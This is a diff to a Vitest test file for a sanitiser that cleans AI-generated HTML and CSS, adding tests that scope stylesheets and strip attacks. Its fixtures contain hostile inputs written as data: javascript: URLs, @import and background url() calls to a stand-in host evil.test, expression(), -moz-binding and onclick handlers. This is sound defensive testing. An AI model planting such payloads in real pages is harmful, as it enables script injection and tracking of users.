@@ -1,6 +1,6 @@
 import { describe, expect, it } from 'vitest'
 
-import { sanitiseHtml, sanitisePartialHtml } from './sanitise'
+import { DESIGN_SCOPE, sanitiseCss, sanitiseHtml, sanitisePartialHtml } from './sanitise'
 
 /**
  * The sanitiser stands between model output and dangerouslySetInnerHTML, and
@@ -16,7 +16,6 @@ describe('sanitiseHtml — what it must remove', () => {
     ['a javascript: link', '<a href="javascript:alert(1)">Go</a>', 'javascript:'],
     ['an iframe', '<iframe src="https://evil.test"></iframe>', 'iframe'],
     ['an object embed', '<object data="x.swf"></object>', 'object'],
-    ['a style element', '<style>body{display:none}</style>', 'display:none'],
     ['a form', '<form action="https://evil.test"><input></form>', 'evil.test'],
     ['a base tag', '<base href="https://evil.test">', 'base'],
   ])('removes %s', (_label, input, forbidden) => {
@@ -131,5 +130,147 @@ describe('comments', () => {
 
   it('drops a comment nested inside the tree, not only at the top level', () => {
     expect(sanitiseHtml('<div><!-- note --><p>Body</p></div>')).toBe('<div><p>Body</p></div>')
+  })
+})
+
+/**
+ * The stylesheet is what makes a generated design interactive rather than a
+ * picture of an interface — an inline style cannot express :hover, :focus or
+ * :checked, so without it no control can ever respond.
+ *
+ * It is also the widest thing the model is allowed to write, so these are
+ * written as attacks. Two properties matter: a design can never style anything
+ * outside itself, and it can never fetch from anywhere it should not.
+ */
+const scope = `.${DESIGN_SCOPE}`
+
+describe('sanitiseCss — reach', () => {
+  it('confines an ordinary selector to the design', () => {
+    expect(sanitiseCss('.card { color: red }')).toBe(`${scope} .card{color: red}`)
+  })
+
+  it.each(['body', 'html', ':root'])(
+    'retargets %s at the wrapper instead of the real page',
+    (root) => {
+      // Dropping these would leave the design unpainted — it is how a design
+      // states its own page colour — but honouring them would let a generated
+      // page restyle the editor around it.
+      const css = sanitiseCss(`${root} { background: black }`)
+      expect(css).toBe(`${scope}{background: black}`)
+      expect(css.startsWith(scope)).toBe(true)
+    },
+  )
+
+  it('cannot blank the application', () => {
+    const css = sanitiseCss('body { display: none }')
+    expect(css).not.toMatch(/(^|[^-\w])body\s*\{/)
+  })
+
+  it('scopes every selector in a list, not just the first', () => {
+    expect(sanitiseCss('.a, .b { color: red }')).toBe(`${scope} .a, ${scope} .b{color: red}`)
+  })
+
+  it('scopes rules inside a media query', () => {
+    expect(sanitiseCss('@media (max-width: 600px) { .a { color: red } }')).toBe(
+      `@media (max-width: 600px){${scope} .a{color: red}}`,
+    )
+  })
+
+  it('leaves keyframe stops alone, which are not selectors', () => {
+    // Scoping these produces `.mason-design 0%`, which matches nothing and
+    // silently kills every animation in the design.
+    const css = sanitiseCss('@keyframes fade { 0% { opacity: 0 } 100% { opacity: 1 } }')
+    expect(css).toContain('@keyframes fade')
+    expect(css).not.toContain(`${scope} 0%`)
+  })
+
+  it('is not desynchronised by a brace hidden in a comment', () => {
+    const css = sanitiseCss('/* } body { display:none */ .a { color: red }')
+    expect(css).toBe(`${scope} .a{color: red}`)
+  })
+})
+
+describe('sanitiseCss — exfiltration', () => {
+  it.each([
+    ['@import', '@import url("https://evil.test/x.css"); .a { color: red }', 'evil.test'],
+    // Tighter than the <img> rule on purpose: a background image is a quiet
+    // way to tell a third party every time a shared design is opened.
+    ['an https background', '.a { background: url(https://evil.test/pixel.png) }', 'evil.test'],
+    ['an http url', '.a { background: url(http://evil.test/p.png) }', 'evil.test'],
+    ['legacy expression()', '.a { width: expression(alert(1)) }', 'expression'],
+    ['a javascript url', '.a { background: url(javascript:alert(1)) }', 'javascript'],
+    ['-moz-binding', '.a { -moz-binding: url(https://evil.test/x.xml) }', 'binding'],
+  ])('drops %s', (_label, css, forbidden) => {
+    expect(sanitiseCss(css).toLowerCase()).not.toContain(forbidden.toLowerCase())
+  })
+
+  it('drops only the offending declaration, keeping the rest of the rule', () => {
+    const css = sanitiseCss('.a { color: red; background: url(http://evil.test/p.png); gap: 4px }')
+    expect(css).toContain('color: red')
+    expect(css).toContain('gap: 4px')
+    expect(css).not.toContain('evil.test')
+  })
+
+  it('keeps an inline image and the app’s own photo route', () => {
+    expect(sanitiseCss('.a { background: url(data:image/png;base64,iVBOR) }')).toContain('data:image/png')
+    expect(sanitiseCss('.a { background: url(/api/image/800/600/plant?i=0) }')).toContain('/api/image/')
+  })
+
+  it('does not mangle a data URI on the semicolon inside it', () => {
+    const css = sanitiseCss('.a { background: url("data:image/svg+xml;utf8,<svg/>"); color: red }')
+    expect(css).toContain('data:image/svg+xml;utf8')
+    expect(css).toContain('color: red')
+  })
+})
+
+describe('interactive markup', () => {
+  it('keeps a real input typeable', () => {
+    const html = sanitiseHtml('<input type="text" id="email" name="email" placeholder="You">')
+    expect(html).toContain('type="text"')
+    expect(html).toContain('placeholder="You"')
+    expect(html).toContain('id="email"')
+  })
+
+  it('keeps the label/input pairing that makes a click land', () => {
+    const html = sanitiseHtml('<input type="radio" id="m48" name="memory" checked><label for="m48">48GB</label>')
+    expect(html).toContain('for="m48"')
+    expect(html).toContain('name="memory"')
+    expect(html).toContain('checked')
+  })
+
+  it('keeps details and summary, which open with no script', () => {
+    const html = sanitiseHtml('<details open><summary>More</summary><p>Body</p></details>')
+    expect(html).toContain('<details')
+    expect(html).toContain('<summary>')
+    expect(html).toContain('open')
+  })
+
+  it('keeps a class, which is what the stylesheet selects on', () => {
+    expect(sanitiseHtml('<div class="opt">x</div>')).toContain('class="opt"')
+  })
+
+  it('keeps a select and its options', () => {
+    const html = sanitiseHtml('<select name="size"><option value="s" selected>Small</option></select>')
+    expect(html).toContain('<select')
+    expect(html).toContain('<option')
+    expect(html).toContain('selected')
+  })
+
+  it('still refuses a handler on an interactive element', () => {
+    // Widening the tag list must not widen what can run.
+    const html = sanitiseHtml('<button onclick="steal()" onfocus="steal()">Go</button>')
+    expect(html).not.toContain('steal')
+    expect(html).toContain('<button')
+  })
+
+  it('sanitises the stylesheet it now allows through', () => {
+    const html = sanitiseHtml('<style>body { display: none } .a:hover { color: red }</style><div class="a">x</div>')
+    expect(html).toContain('<style>')
+    expect(html).toContain(`${scope} .a:hover`)
+    expect(html).not.toMatch(/(^|[^-\w])body\s*\{/)
+  })
+
+  it('removes a style element with nothing safe left in it', () => {
+    expect(sanitiseHtml('<style>@import url("https://evil.test/x.css");</style>')).not.toContain('<style>')
   })
 })
